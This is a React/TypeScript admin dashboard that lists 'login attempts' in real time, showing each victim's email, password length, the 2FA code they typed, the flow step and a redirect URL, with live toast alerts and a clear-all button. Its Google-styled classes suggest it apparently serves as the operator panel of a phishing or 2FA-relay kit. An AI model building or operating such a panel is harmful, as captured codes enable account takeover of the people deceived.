import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Trash2, RefreshCw } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import type { LoginAttempt } from "@shared/schema";
import { useToast } from "@/hooks/use-toast";
import { createClient } from "@supabase/supabase-js";

// Initialize Supabase client for real-time subscriptions
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || "";
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || "";
const supabase = supabaseUrl && supabaseAnonKey ? createClient(supabaseUrl, supabaseAnonKey) : null;

export default function Admin() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const subscriptionRef = useRef<any>(null);

  const { data: attempts = [], isLoading, refetch } = useQuery<LoginAttempt[]>({
    queryKey: ['/api/login-attempts'],
  });

  // Set up real-time subscription
  useEffect(() => {
    if (!supabase) {
      console.warn("Supabase not configured for real-time updates");
      return;
    }

    // Subscribe to login_attempts table
    subscriptionRef.current = supabase
      .channel('login_attempts_changes')
      .on('postgres_changes', 
        {
          event: '*', // Listen to all events (INSERT, UPDATE, DELETE)
          schema: 'public',
          table: 'login_attempts'
        },
        (payload: any) => {
          // Auto-refresh data when changes detected
          queryClient.invalidateQueries({ queryKey: ['/api/login-attempts'] });
          
          // Show toast notification
          toast({
            title: "New login attempt",
            description: `Step ${payload.new?.step} - ${payload.new?.stepName?.replace('_', ' ')}`,
          });
        }
      )
      .subscribe();

    // Cleanup subscription
    return () => {
      if (subscriptionRef.current) {
        subscriptionRef.current.unsubscribe();
      }
    };
  }, [queryClient, toast]);

  const clearAttemptsMutation = useMutation({
    mutationFn: async () => {
      const response = await apiRequest('DELETE', '/api/login-attempts');
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/login-attempts'] });
      toast({
        title: "Success",
        description: "All login attempts have been cleared.",
      });
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to clear login attempts.",
        variant: "destructive",
      });
    },
  });

  const formatTimestamp = (timestamp: string | Date) => {
    return new Date(timestamp).toLocaleString();
  };

  const getStepBadgeColor = (step: number) => {
    switch (step) {
      case 1: return "bg-blue-100 text-blue-800";
      case 2: return "bg-green-100 text-green-800";
      case 3: return "bg-yellow-100 text-yellow-800";
      case 4: return "bg-purple-100 text-purple-800";
      default: return "bg-gray-100 text-gray-800";
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-8 h-8 animate-spin mx-auto mb-4 text-google-blue" />
          <p className="text-google-gray">Loading login attempts...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-6xl mx-auto px-4">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Login Attempts Dashboard</h1>
          <p className="text-gray-600">View all recorded login attempts and user interactions</p>
        </div>

        <div className="flex justify-between items-center mb-6">
          <div className="flex items-center space-x-4">
            <Button 
              onClick={() => refetch()}
              variant="outline"
              className="flex items-center space-x-2"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Refresh</span>
            </Button>
            <Badge variant="secondary" className="text-base px-3 py-1">
              Total Attempts: {attempts.length}
            </Badge>
          </div>

          <Button
            onClick={() => clearAttemptsMutation.mutate()}
            variant="destructive"
            disabled={clearAttemptsMutation.isPending || attempts.length === 0}
            className="flex items-center space-x-2"
          >
            <Trash2 className="w-4 h-4" />
            <span>{clearAttemptsMutation.isPending ? 'Clearing...' : 'Clear All'}</span>
          </Button>
        </div>

        {attempts.length === 0 ? (
          <Card className="text-center py-12">
            <CardContent>
              <p className="text-gray-500 text-lg mb-4">No login attempts recorded yet</p>
              <p className="text-gray-400">Start using the login form to see attempts here</p>
            </CardContent>
          </Card>
        ) : (
          <div className="grid gap-4">
            {attempts
              .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
              .map((attempt) => (
                <Card key={attempt.id} className="hover:shadow-md transition-shadow">
                  <CardHeader className="pb-3">
                    <div className="flex justify-between items-start">
                      <div>
                        <CardTitle className="text-lg flex items-center space-x-3">
                          <Badge className={getStepBadgeColor(attempt.step)}>
                            Step {attempt.step}
                          </Badge>
                          <span className="text-gray-700">{attempt.stepName.replace('_', ' ')}</span>
                        </CardTitle>
                        <CardDescription className="mt-1">
                          Session: <code className="bg-gray-100 px-1 rounded text-xs">{attempt.sessionId}</code>
                        </CardDescription>
                      </div>
                      <div className="text-right text-sm text-gray-500">
                        {formatTimestamp(attempt.timestamp)}
                      </div>
                    </div>
                  </CardHeader>
                  
                  <CardContent className="pt-0">
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
                      {attempt.email && (
                        <div>
                          <span className="font-medium text-gray-600">Email:</span>
                          <p className="text-gray-900 mt-1">{attempt.email}</p>
                        </div>
                      )}
                      
                      {attempt.passwordLength && (
                        <div>
                          <span className="font-medoes text-gray-600">Password Length:</span>
                          <p className="text-gray-900 mt-1">{attempt.passwordLength} characters</p>
                        </div>
                      )}
                      
                      {attempt.twoFactorCode && (
                        <div>
                          <span className="font-medium text-gray-600">2FA Code:</span>
                          <p className="text-gray-900 mt-1 font-mono">{attempt.twoFactorCode}</p>
                        </div>
                      )}
                      
                      {attempt.attempt && (
                        <div>
                          <span className="font-medium text-gray-600">Attempt Type:</span>
                          <p className="text-gray-900 mt-1 capitalize">{attempt.attempt}</p>
                        </div>
                      )}
                      
                      {attempt.result && (
                        <div>
                          <span className="font-medium text-gray-600">Result:</span>
                          <Badge 
                            variant={attempt.result === 'success' ? 'default' : 'destructive'}
                            className="mt-1"
                          >
                            {attempt.result}
                          </Badge>
                        </div>
                      )}
                      
                      {attempt.action && (
                        <div>
                          <span className="font-medium text-gray-600">Action:</span>
                          <p className="text-gray-900 mt-1 capitalize">{attempt.action.replace('_', ' ')}</p>
                        </div>
                      )}
                      
                      {attempt.redirectUrl && (
                        <div className="md:col-span-2 lg:col-span-3">
                          <span className="font-medium text-gray-600">Redirect URL:</span>
                          <p className="text-blue-600 mt-1 break-all">{attempt.redirectUrl}</p>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              ))}
          </div>
        )}
      </div>
    </div>
  );
}